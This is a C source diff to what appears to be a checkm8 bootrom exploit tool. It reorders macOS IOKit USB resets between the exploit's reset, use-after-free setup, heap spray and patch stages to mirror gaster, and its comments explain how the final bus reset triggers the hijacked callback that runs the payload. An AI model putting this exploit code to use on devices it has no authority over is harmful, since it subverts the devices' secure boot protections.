@@ -64,6 +64,34 @@ int dfu_init(dfu_ctx_t *ctx, device_info_t *dev)
 /* dfu_deliver                                                     */
 /* ------------------------------------------------------------------ */
 
+#if defined(__APPLE__)
+/*
+ * E19 (E17 diff): gaster's main loop separates its stages STRICTLY --
+ * after EVERY stage (reset_usb_handle = ResetDevice + ReEnumerate,
+ * then close_usb_handle) it reopens a fresh handle via wait_usb_handle
+ * (SetConfiguration(1) + async event source) and re-reads the serial
+ * in checkm8_check_usb_device.  The winning run showed RESET/SETUP/
+ * SPRAY/PATCH each on its own handle.  This helper mirrors that cycle
+ * between our stages.
+ */
+static int dfu_iokit_interstage_reset(dfu_ctx_t *ctx)
+{
+    (void)ctx;
+    log_info("dfu_deliver: inter-stage reset (gaster reset_usb_handle)");
+    iokit_usb_reset_device();
+    usleep(20000);
+    iokit_usb_reenumerate();
+    iokit_usb_deactivate();
+    usleep(250000); /* device re-enumerates; fresh handle next */
+    if (iokit_usb_activate() != 0) {
+        log_error("dfu_deliver: IOKit re-activate after inter-stage "
+                  "reset failed");
+        return -1;
+    }
+    return 0;
+}
+#endif
+
 int dfu_deliver(dfu_ctx_t *ctx)
 {
     if (!ctx || !ctx->dev || !ctx->chip)
@@ -71,60 +99,70 @@ int dfu_deliver(dfu_ctx_t *ctx)
 
     log_info("dfu_deliver: starting checkm8 on %s", ctx->chip->name);
 
-    /* Stage 1: Reset DFU state (via libusb) */
+#if defined(__APPLE__)
+    /*
+     * E19 (E17/E16 decisive fact): the winning gaster run executes ALL
+     * FOUR stages on the IOKit backend (make macos builds
+     * DeviceRequestTO/DeviceRequestAsyncTO everywhere -- the raw
+     * IOReturns 0xe000404f/0xe0004051 in the E17 trace prove it).  We
+     * previously ran stages 1-2 on libusb and only switched to IOKit
+     * for stages 3-4; stage-2 attempt 3 then went through the libusb
+     * cancel path (sent=0) instead of gaster's async submit +
+     * sleep_ms(0) + USBDeviceAbortPipeZero (device accepts 64 bytes
+     * BEFORE the STALL, "ASYNC_DONE ... sz=64 status=1").  Activate
+     * IOKit BEFORE stage 1 so every stage matches that transport.
+     */
+    {
+        iokit_usb_deactivate();
+        usb_dfu_close(ctx->dev->usb);
+        ctx->dev->usb = NULL;
+        if (iokit_usb_activate() != 0) {
+            log_error("dfu_deliver: IOKit activation failed");
+            goto error;
+        }
+        log_info("dfu_deliver: IOKit active for ALL stages "
+                 "(gaster-exact transport, E19)");
+    }
+#endif
+
+    /* Stage 1: Reset DFU state (gaster cycle: DNLOAD16 -> 0 -> 3x
+     * GETSTATUS -> DNLOAD64) */
     if (checkm8_stage_reset(ctx) != 0)
         goto error;
 
-    /* Stage 2: Setup UAF (via libusb, needs async cancel) */
+#if defined(__APPLE__)
+    /* E19: gaster resets after EVERY stage -- this one (reset->setup)
+     * was missing entirely.  Stage 1 ends with a 64-byte DNLOAD loaded
+     * into the device; setup must start from a fresh re-enumerated
+     * handle exactly like gaster's loop. */
+    if (iokit_usb_is_active()) {
+        if (dfu_iokit_interstage_reset(ctx) != 0)
+            goto error;
+    }
+#endif
+
+    /* Stage 2: Setup UAF (async DNLOAD + abort; IOKit timing on macOS) */
     if (checkm8_stage_setup(ctx) != 0)
         goto error;
 
 #if defined(__APPLE__)
     /*
-     * macOS Apple Silicon: switch from libusb to IOKit AFTER Stage 2 setup.
+     * E19: inter-stage reset (setup->spray) -- gaster does it; we
+     * previously only reset between spray and patch.
      *
-     * Stage 2's async cancel triggers AbortPipeZero inside libusb, which
-     * leaves the libusb Darwin driver in a state where subsequent async
-     * transfers fail.
-     *
-     * By closing libusb and activating our direct IOKit backend now,
-     * Stages 3 and 4 will use synchronous DeviceRequestTO, which bypasses
-     * the corrupted libusb async state machine and handles EP0 properly.
+     * Do NOT send CLR_STATUS / DFU_ABORT as part of this transition
+     * (matching gaster).  After stage 2 the device sits in
+     * dfuDNLOAD-IDLE with the pending io_request we intend to hijack.
+     * DFU-class commands from dfuIDLE corrupt the EP0 ring on Apple
+     * Silicon XHCI (kIOReturnNotReady -> device re-enumerates -> the
+     * IOKit IOService dies -> kIOReturnNoDevice for every later
+     * transfer).  The spray's stall/leak/no_leak requests walk the DFU
+     * state machine forward naturally; the final CLR_STATUS inside the
+     * spray (skip_clrstatus=0) is what brings it back to dfuIDLE.
      */
-    {
-        log_info("dfu_deliver: closing libusb after Stage 2 setup");
-        usb_dfu_close(ctx->dev->usb);
-        ctx->dev->usb = NULL;
-
-        log_info("dfu_deliver: switching to IOKit for Stages 3-4");
-
-        /* Deactivate any previous IOKit handle before re-activating,
-         * so retry attempts get a fresh device connection instead of
-         * reusing a stale handle left over from the prior attempt. */
-        iokit_usb_deactivate();
-
-        if (iokit_usb_activate() != 0) {
-            log_error("dfu_deliver: IOKit activation failed");
+    if (iokit_usb_is_active()) {
+        if (dfu_iokit_interstage_reset(ctx) != 0)
             goto error;
-        }
-
-        /* Clean host-side XHCI EP0 ring */
-        iokit_usb_abort_pipe_zero();
-        usleep(50000);
-
-        /*
-         * Do NOT send CLR_STATUS / DFU_ABORT here (matching gaster).
-         *
-         * After stage 2 the device sits in dfuDNLOAD-IDLE with the
-         * pending io_request we intend to hijack.  DFU-class commands
-         * from dfuIDLE corrupt the EP0 ring on Apple Silicon XHCI
-         * (kIOReturnNotReady → device re-enumerates → the IOKit
-         * IOService dies → kIOReturnNoDevice for every later transfer).
-         *
-         * The spray's stall/leak/no_leak requests walk the DFU state
-         * machine forward naturally; the final CLR_STATUS inside the
-         * spray (skip_clrstatus=0) is what brings it back to dfuIDLE.
-         */
         ctx->skip_clrstatus = 0;
 
         /* E13: allow skipping the stage-3 CLR_STATUS (the sync wedge +
@@ -145,27 +183,12 @@ int dfu_deliver(dfu_ctx_t *ctx)
     }
 
 #if defined(__APPLE__)
-    /*
-     * E18 (E16 diff, gaster.c L1268/1273): gaster separates stages
-     * STRICTLY -- after EVERY stage it does reset_usb_handle()
-     * (ResetDevice + USBDeviceReEnumerate) and closes the handle,
-     * reopening a fresh one for the next stage.  The winning run
-     * showed RESET/SETUP/SPRAY/PATCH each on its own handle.  Insert
-     * the inter-stage reset here (spray -> patch): deactivate,
-     * reset+re-enum, re-activate a fresh user client.
-     */
+    /* E18/E19: gaster separates spray and patch with reset_usb_handle
+     * + close + reopen (E17 trace: descriptor + serial read between
+     * the SPRAY and PATCH sections). */
     if (iokit_usb_is_active()) {
-        log_info("dfu_deliver: inter-stage reset (gaster reset_usb_handle)");
-        iokit_usb_reset_device();
-        usleep(20000);
-        iokit_usb_reenumerate();
-        iokit_usb_deactivate();
-        usleep(250000); /* device re-enumerates; fresh handle next */
-        if (iokit_usb_activate() != 0) {
-            log_error("dfu_deliver: IOKit re-activate after inter-stage "
-                      "reset failed");
+        if (dfu_iokit_interstage_reset(ctx) != 0)
             goto error;
-        }
     }
 #endif
 
@@ -175,6 +198,21 @@ int dfu_deliver(dfu_ctx_t *ctx)
     }
 
 #if defined(__APPLE__)
+    /*
+     * E19: gaster's loop resets after the LAST stage too (gaster.c
+     * L1347 reset_usb_handle runs unconditionally after every stage,
+     * before close_usb_handle L1352).  That ResetDevice +
+     * USBDeviceReEnumerate fires the hijacked dfu_handle_bus_reset
+     * callback -- i.e. it EXECUTES the payload.  Without it the device
+     * sits in DFU waiting for a bus reset that never comes.
+     * checkm8_verify then re-reads the re-enumerated serial
+     * (gaster: wait_usb_handle + checkm8_check_usb_device -> PWND).
+     */
+    if (iokit_usb_is_active()) {
+        iokit_usb_reset_device();
+        usleep(20000);
+        iokit_usb_reenumerate();
+    }
     iokit_usb_deactivate();
 #endif
 
@@ -234,8 +272,16 @@ int checkm8_verify(device_info_t *dev)
     uint32_t cpid = 0;
     uint64_t ecid = 0;
 
-    if (!dev || !dev->usb)
+    if (!dev)
         return -1;
+#if !defined(__APPLE__)
+    /* Linux: verification needs the libusb handle. */
+    if (!dev->usb)
+        return -1;
+#endif
+    /* E19 (macOS): with the gaster-exact flow libusb is closed for the
+     * whole run (dev->usb == NULL) and the IOKit path below owns
+     * verification. */
 
     memset(serial, 0, sizeof(serial));
 
